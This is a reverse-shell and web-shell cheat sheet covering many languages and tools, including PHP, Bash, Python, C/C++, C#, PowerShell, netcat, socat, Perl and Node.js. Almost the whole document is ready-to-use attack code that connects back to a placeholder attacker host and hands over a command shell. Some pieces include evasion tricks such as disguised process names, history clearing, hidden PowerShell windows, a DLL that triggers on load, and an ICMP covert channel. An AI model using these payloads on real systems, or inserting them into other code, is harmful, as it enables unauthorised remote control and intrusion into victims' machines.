██ PHP

    - <?php passthru('/bin/bash -c "exec nohup setsid /bin/bash 0</dev/tcp/VAR_ATTACKER_HOST/VAR_ATTACKER_PORT 1>&0 2>&0 &"'); ?>
    - <?php $sock=fsockopen("VAR_ATTACKER_HOST", VAR_ATTACKER_PORT); $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
    - <?php $sock=fsockopen("VAR_ATTACKER_HOST", VAR_ATTACKER_PORT); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
    - <?php passthru($_GET["cmd"]); ?>
    - <?php passthru($_GET["cmd"]); die(); ?>
    - <?php passthru('rm /tmp/.kernel;mkfifo /tmp/.kernel;cat /tmp/.kernel|/bin/sh -i 2>&1|nc VAR_ATTACKER_HOST VAR_ATTACKER_PORT >/tmp/.kernel'); ?>
    - <?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>
    - <?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
        # If file descriptor 3 doesn’t work, try 4, 5 or 6
    - <?php @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set("max_execution_time",0);$s=@fsockopen("tcp://VAR_ATTACKER_HOST",VAR_ATTACKER_PORT);while($c=fread($s,2048)){$out="";if(substr($c,0,3)=='cd '){chdir(substr($c,3,-1));}else if(substr($c,0,4)=="quit"||substr($c,0,4)=="exit"){break;}else{$out=shell_exec(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs);break;}}fwrite($s,$out);}fclose($s);?>
        # Windows

██ Bash

    ~$ /bin/bash -c "exec /bin/sh 0</dev/tcp/VAR_ATTACKER_HOST/VAR_ATTACKER_PORT 1>&0 2>&0 &"
    ~$ /bin/bash -i >& /dev/tcp/VAR_ATTACKER_HOST/VAR_ATTACKER_PORT 0>&1
    ~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VAR_ATTACKER_HOST VAR_ATTACKER_PORT >/tmp/f
    ~$ /bin/bash 0< /tmp/.tmppipe | nc 172.16.1.1 8080 1> /tmp/.tmppipe

██ Python

    ▒▒ GNU/Linux

        ~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VAR_ATTACKER_HOST",VAR_ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    ▒▒ Windows

        ~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VAR_ATTACKER_HOST",VAR_ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%ComSpec%"]);'

██ C

    ▒▒ GNU/Linux

        #include <stdio.h>
        #include <unistd.h>
        #include <netinet/in.h>
        #include <sys/types.h>
        #include <sys/socket.h>
        #define REMOTE_ADDR "VAR_ATTACKER_HOST"
        #define REMOTE_PORT VAR_ATTACKER_PORT
        int main(int argc, char *argv[])
        {
            struct sockaddr_in sa;
            int s;
            sa.sin_family = AF_INET;
            sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
            sa.sin_port = htons(REMOTE_PORT);
            s = socket(AF_INET, SOCK_STREAM, 0);
            connect(s, (struct sockaddr *)&sa, sizeof(sa));
            dup2(s, 0);
            dup2(s, 1);
            dup2(s, 2);
            execve("/bin/sh", 0, 0);
            return 0;
        }

    ▒▒ Windows

        echo #include ^<winsock2.h^> >> shell.c
        echo #include ^<stdio.h^> >> shell.c
        echo #pragma comment(lib, "w2_32") >> shell.c
        echo WSADATA wsaData; >> shell.c
        echo SOCKET Winsock; >> shell.c
        echo SOCKET Sock; >> shell.c
        echo struct sockaddr_in hax; >> shell.c
        echo char aip_addr[16]; >> shell.c
        echo STARTUPINFO ini_processo; >> shell.c
        echo PROCESS_INFORMATION processo_info; >> shell.c
        echo int main(int argc, char *argv[]) >> shell.c
        echo { >> shell.c
        echo    WSAStartup(MAKEWORD(2,2), ^&wsaData); >> shell.c
        echo    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL); >> shell.c
        echo        if (argv[1] == NULL){ >> shell.c
        echo        exit(1); >> shell.c
        echo    } >> shell.c
        echo        struct hostent *host; >> shell.c
        echo    host = gethostbyname(argv[1]); >> shell.c
        echo    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr))); >> shell.c
        echo    hax.sin_family = AF_INET; >> shell.c
        echo    hax.sin_port = htons(atoi(argv[2])); >> shell.c
        echo    hax.sin_addr.s_addr =inet_addr(aip_addr); >> shell.c
        echo    WSAConnect(Winsock,(SOCKADDR*)^&hax, sizeof(hax),NULL,NULL,NULL,NULL); >> shell.c
        echo    if (WSAGetLastError() == 0) { >> shell.c
        echo        memset(^&ini_processo, 0, sizeof(ini_processo)); >> shell.c
        echo        ini_processo.cb=sizeof(ini_processo); >> shell.c
        echo        ini_processo.dwFlags=STARTF_USESTDHANDLES; >> shell.c
        echo        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock; >> shell.c
        echo        char *myArray[4] = { "cm", "d.e", "x", "e" }; >> shell.c
        echo        char command[8] = ""; >> shell.c
        echo        snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]); >> shell.c
        echo        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, ^&ini_processo, ^&processo_info); >> shell.c
        echo        exit(0); >> shell.c
        echo    } else { >> shell.c
        echo        exit(0); >> shell.c
        echo    } >> shell.c
        echo } >> shell.c

    ▒▒ Windows (DLL)

        # gcc -shared -lws2_32 -o dll_rev_shell.dll dll_rev_shell.c
        # rundll32 rev.dll,main

        //#include "pch.h"
        #include "stdlib.h"
        #define _WINSOCK_DEPRECATED_NO_WARNINGS
        #include <winsock2.h>
        #include <stdio.h>
        #pragma comment(lib,"ws2_32")

        //using namespace std;
        WSADATA wsaData;
        SOCKET s1;
        struct sockaddr_in hax;
        char ip_addr[16];
        STARTUPINFO sui;
        PROCESS_INFORMATION pi;
        void executepayload(void)
        {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        hax.sin_family = AF_INET;
        hax.sin_port = htons(VAR_ATTACKER_PORT);
        hax.sin_addr.s_addr = inet_addr("VAR_ATTACKER_HOST");

        WSAConnect(s1, (SOCKADDR*)& hax, sizeof(hax), NULL, NULL, NULL, NULL);

        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

        TCHAR commandLine[256] = "cmd.exe";
        CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); // EDR Prevention using api hooking
        }
        BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
        )
        {
        switch (ul_reason_for_call)
        {

        case DLL_PROCESS_ATTACH:
            executepayload();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
        }

██ C++

    ▒▒ Windows [Source: https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus.cpp]

        # Compile with g++/i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

        #include <winsock2.h>
        #include <windows.h>
        #include <ws2tcpip.h>
        #pragma comment(lib, "Ws2_32.lib")
        #define DEFAULT_BUFLEN 1024

        void RunShell(char* C2Server, int C2Port) {
            while(true) {
                Sleep(5000);
                SOCKET mySocket;
                sockaddr_in addr;
                WSADATA version;
                WSAStartup(MAKEWORD(2,2), &version);
                mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = inet_addr(C2Server);
                addr.sin_port = htons(C2Port);
                if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                else {
                    char RecvData[DEFAULT_BUFLEN];
                    memset(RecvData, 0, sizeof(RecvData));
                    int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                    if (RecvCode <= 0) {
                        closesocket(mySocket);
                        WSACleanup();
                        continue;
                    }
                    else {
                        char Process[] = "cmd.exe";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);

                        memset(RecvData, 0, sizeof(RecvData));
                        int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                        if (RecvCode <= 0) {
                            closesocket(mySocket);
                            WSACleanup();
                            continue;
                        }
                        if (strcmp(RecvData, "exit\n") == 0) {
                            exit(0);
                        }
                    }
                }
            }
        }
        int main(int argc, char **argv) {
            FreeConsole();
            if (argc == 3) {
                int port  = atoi(argv[2]);
                RunShell(argv[1], port);
            }
            else {
                char host[] = "VAR_ATTACKER_HOST";
                int port = VAR_ATTACKER_PORT;
                RunShell(host, port);
            }
            return 0;
        }
██ C#

    ▒▒ Windows

        using System;
        using System.Text;
        using System.IO;
        using System.Diagnostics;
        using System.ComponentModel;
        using System.Linq;
        using System.Net;
        using System.Net.Sockets;

        namespace ConnectBack
        {
            public class Program
            {
                static StreamWriter streamWriter;
                public static void Main(string[] args)
                {
                    using(TcpClient client = new TcpClient("VAR_ATTACKER_HOST", VAR_ATTACKER_PORT))
                    {
                        using(Stream stream = client.GetStream())
                        {
                            using(StreamReader rdr = new StreamReader(stream))
                            {
                                streamWriter = new StreamWriter(stream);
                                StringBuilder strInput = new StringBuilder();
                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                p.Start();
                                p.BeginOutputReadLine();
                                while(true)
                                {
                                    strInput.Append(rdr.ReadLine());
                                    //strInput.Append("\n");
                                    p.StandardInput.WriteLine(strInput);
                                    strInput.Remove(0, strInput.Length);
                                }
                            }
                        }
                    }
                }
                private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
                {
                    StringBuilder strOutput = new StringBuilder();

                    if (!String.IsNullOrEmpty(outLine.Data))
                    {
                        try
                        {
                            strOutput.Append(outLine.Data);
                            streamWriter.WriteLine(strOutput);
                            streamWriter.Flush();
                        }
                        catch (Exception err) { }
                    }
                }
            }
        }

██ Powershell

    ▒▒ CLI

        ~> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("VAR_ATTACKER_HOST",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        ~> powershell -nop -c "$ip='VAR_ATTACKER_HOST'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"

    ▒▒ shell.ps1

        function cleanup {
        if ($client.Connected -eq $true) {$client.Close()}
        if ($process.ExitCode -ne $null) {$process.Close()}
        exit}
        // Setup IPADDR
        $address = 'VAR_ATTACKER_HOST'
        // Setup PORT
        $port = 'VAR_ATTACKER_PORT'
        $client = New-Object system.net.sockets.tcpclient
        $client.connect($address,$port)
        $stream = $client.GetStream()
        $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
        $process.StartInfo.RedirectStandardInput = 1
        $process.StartInfo.RedirectStandardOutput = 1
        $process.StartInfo.UseShellExecute = 0
        $process.Start()
        $inputstream = $process.StandardInput
        $outputstream = $process.StandardOutput
        Start-Sleep 1
        $encoding = new-object System.Text.AsciiEncoding
        while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
        $stream.Write($encoding.GetBytes($out),0,$out.Length)
        $out = $null; $done = $false; $testing = 0;
        while (-not $done) {
        if ($client.Connected -ne $true) {cleanup}
        $pos = 0; $i = 1
        while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
        $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
        $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
        if ($pos -gt 0) {
        $string = $encoding.GetString($networkbuffer,0,$pos)
        $inputstream.write($string)
        start-sleep 1
        if ($process.ExitCode -ne $null) {cleanup}
        else {
        $out = $encoding.GetString($outputstream.Read())
        while($outputstream.Peek() -ne -1){
        $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
        $stream.Write($encoding.GetBytes($out),0,$out.length)
        $out = $null
        $string = $null}} else {cleanup}}

██ telnetd

    ~$ /usr/sbin/telnetd -l bin/sh -p 25

██ openssl

    ~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    ~$ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
    ~$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -CAfile /tmp/cert.pem -verify_return_error -verify 1 -connect VAR_ATTACKER_HOST:VAR_ATTACKER_PORT > /tmp/s; rm /tmp/s

██ nc

    ~$ nc -e /bin/sh VAR_ATTACKER_HOST VAR_ATTACKER_PORT
    ~$ rm -f /tmp/p; mknod /tmp/p p && nc VAR_ATTACKER_HOST VAR_ATTACKER_PORT 0/tmp/p
    ~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VAR_ATTACKER_HOST VAR_ATTACKER_PORT >/tmp/f

██ Java

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/VAR_ATTACKER_HOST/VAR_ATTACKER_PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

    ~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=VAR_ATTACKER_HOST LPORT=VAR_ATTACKER_PORT -f war > /root/Desktop/shell.war

██ Ruby

    ~$ ruby -rsocket -e'f=TCPSocket.open("VAR_ATTACKER_HOST",VAR_ATTACKER_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

██ X

    ▒▒ Target

        ~$ xterm -display VAR_ATTACKER_HOST:1

    ▒▒ Attacker

        ~$ Xnest :1 -listen tcp
        ~$ xhost +VAR_TARGET_HOST

██ telnet

    ~$ rm -f /tmp/p; mknod /tmp/p p && telnet VAR_ATTACKER_HOST VAR_ATTACKER_PORT 0/tmp/p
    ~$ telnet VAR_ATTACKER_HOST 80 | /bin/bash | telnet VAR_ATTACKER_HOST 443

██ Gawk

    ~$ awk 'BEGIN {s = "/inet/tcp/0/VAR_ATTACKER_HOST/VAR_ATTACKER_PORT"; while(1) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

██ VBScript

    <%
    Function RunCmd(command)
     Dim res as integer
     Dim myProcess As New Process()
     Dim myProcessStartInfo As New ProcessStartInfo("c:\windows\system32\cmd.exe")
     myProcessStartInfo.UseShellExecute = false
     myProcessStartInfo.RedirectStandardOutput = true
     myProcess.StartInfo = myProcessStartInfo
     myProcessStartInfo.Arguments="/c " + command
     myProcess.Start()
     Dim myStreamReader As StreamReader = myProcess.StandardOutput
     Dim myString As String = myStreamReader.Readtoend()
     myProcess.Close()
     RunCmd= MyString
    End Function
    %>
    Enter your shell command

    <%
    if request("cmd") "" then
    response.write("
    <pre>"+ RunCmd(request("cmd"))+ "</pre>
    ")
    end if
    %>

██ Perl

    ▒▒ CLI

        ~$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"VAR_ATTACKER_HOST:VAR_ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
        ~$ perl -e 'use Socket;$i="VAR_ATTACKER_HOST";$p=VAR_ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    ▒▒ shell.pl

        r = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/VAR_ATTACKER_HOST/VAR_ATTACKER_PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()

    ▒▒ perl-reverse-shell

        #!/usr/bin/perl -w
        # perl-reverse-shell - A Reverse Shell implementation in PERL
        # Copyright (C) 2006 pentestmonkey@pentestmonkey.net
        #
        # This tool may be used for legal purposes only.  Users take full responsibility
        # for any actions performed using this tool.  The author accepts no liability
        # for damage caused by this tool.  If these terms are not acceptable to you, then
        # do not use this tool.
        #
        # In all other respects the GPL version 2 applies:
        #
        # This program is free software; you can redistribute it and/or modify
        # it under the terms of the GNU General Public License version 2 as
        # published by the Free Software Foundation.
        #
        # This program is distributed in the hope that it will be useful,
        # but WITHOUT ANY WARRANTY; without even the implied warranty of
        # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        # GNU General Public License for more details.
        #
        # You should have received a copy of the GNU General Public License along
        # with this program; if not, write to the Free Software Foundation, Inc.,
        # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
        #
        # This tool may be used for legal purposes only.  Users take full responsibility
        # for any actions performed using this tool.  If these terms are not acceptable to
        # you, then do not use this tool.
        #
        # You are encouraged to send comments, improvements or suggestions to
        # me at pentestmonkey@pentestmonkey.net
        #
        # Description
        # -----------
        # This script will make an outbound TCP connection to a hardcoded IP and port.
        # The recipient will be given a shell running as the current user (apache normally).
        #

        use strict;
        use Socket;
        use FileHandle;
        use POSIX;
        my $VERSION = "1.0";

        # Where to send the reverse shell.  Change these.
        my $ip = 'VAR_ATTACKER_HOST';
        my $port = VAR_ATTACKER_PORT;

        # Options
        my $daemon = 1;
        my $auth   = 0; # 0 means authentication is disabled and any
                # source IP can access the reverse shell
        my $authorised_client_pattern = qr(^VA\.R\._\.IP$);

        # Declarations
        my $global_page = "";
        my $fake_process_name = "/usr/sbin/apache";

        # Change the process name to be less conspicious
        $0 = "[httpd]";

        # Authenticate based on source IP address if required
        if (defined($ENV{'REMOTE_ADDR'})) {
            cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

            if ($auth) {
                unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
                    cgiprint("ERROR: Your client isn't authorised to view this page");
                    cgiexit();
                }
            }
        } elsif ($auth) {
            cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
            cgiexit(0);
        }

        # Background and dissociate from parent process if required
        if ($daemon) {
            my $pid = fork();
            if ($pid) {
                cgiexit(0); # parent exits
            }

            setsid();
            chdir('/');
            umask(0);
        }

        # Make TCP connection for reverse shell
        socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
            cgiprint("Sent reverse shell to $ip:$port");
            cgiprintpage();
        } else {
            cgiprint("Couldn't open reverse shell to $ip:$port: $!");
            cgiexit();
        }

        # Redirect STDIN, STDOUT and STDERR to the TCP connection
        open(STDIN, ">&SOCK");
        open(STDOUT,">&SOCK");
        open(STDERR,">&SOCK");
        $ENV{'HISTFILE'} = '/dev/null';
        system("w;uname -a;id;pwd");
        exec({"/bin/sh"} ($fake_process_name, "-i"));

        # Wrapper around print
        sub cgiprint {
            my $line = shift;
            $line .= "<p>\n";
            $global_page .= $line;
        }

        # Wrapper around exit
        sub cgiexit {
            cgiprintpage();
            exit 0; # 0 to ensure we don't give a 500 response.
        }

        # Form HTTP response using all the messages gathered by cgiprint so far
        sub cgiprintpage {
            print "Content-Length: " . length($global_page) . "\r
            Connection: close\r
            Content-Type: text\/html\r\n\r\n" . $global_page;
        }

██ socat

    ▒▒ Bind

        ~$ socat TCP-LISTEN:VAR_ATTACKER_PORT,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
        ~$ socat FILE:`tty`,raw,echo=0 TCP:VAR_TARGET_HOST:VAR_ATTACKER_PORT

    ▒▒ Reverse

        ~$ socat TCP-LISTEN:VAR_ATTACKER_PORT,reuseaddr FILE:`tty`,raw,echo=0
        ~$ socat TCP4:VAR_ATTACKER_HOST:VAR_ATTACKER_PORT EXEC:bash,pty,stderr,setsid,sigint,sane

    ▒▒ Encrypted shell

        ░░ Certificates

            ~$ openssl genrsa -out server.key 1024
            ~$ openssl req -new -key server.key -x509 -days 3653 -out server.crt
            ~$ cat server.key server.crt >server.pem
            ~$ chmod 600 server.key server.pem

            ~$ openssl genrsa -out client.key 1024
            ~$ openssl req -new -key client.key -x509 -days 3653 -out client.crt
            ~$ cat client.key client.crt >client.pem
            ~$ chmod 600 client.key client.pem

        ░░ Server

            ~$ socat ssl-l:VAR_ATTACKER_PORT,reuseaddr,fork,cert=server.pem,cafile=client.crt,verify=1 exec:/bin/bash,pty,setsid,setpgid,stderr,ctty

        ░░ Client

            ~$ socat -,raw,echo=0 ssl:VAR_ATTACKER_HOST:VAR_ATTACKER_PORT,cert=client.pem,cafile=server.crt

██ Node.js

    ▒▒ Reverse #1

        (function(){
            var net = require("net"),
                cp = require("child_process"),
                sh = cp.spawn("/bin/sh", []);
            var client = new net.Socket();
            client.connect(VAR_ATTACKER_PORT, "VAR_ATTACKER_HOST", function(){
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
            });
            return /a/;
        })();

    ▒▒ Reverse #2

        require('child_process').exec('nc -e /bin/sh VAR_ATTACKER_HOST VAR_ATTACKER_PORT')
